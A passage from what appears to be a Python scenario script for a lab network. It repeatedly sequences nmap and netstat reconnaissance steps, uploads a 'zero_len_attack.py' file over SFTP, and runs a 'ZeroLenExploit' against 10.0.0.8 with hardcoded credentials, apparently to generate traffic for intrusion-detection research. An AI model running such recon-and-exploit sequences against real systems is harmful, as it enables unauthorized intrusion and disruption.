             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
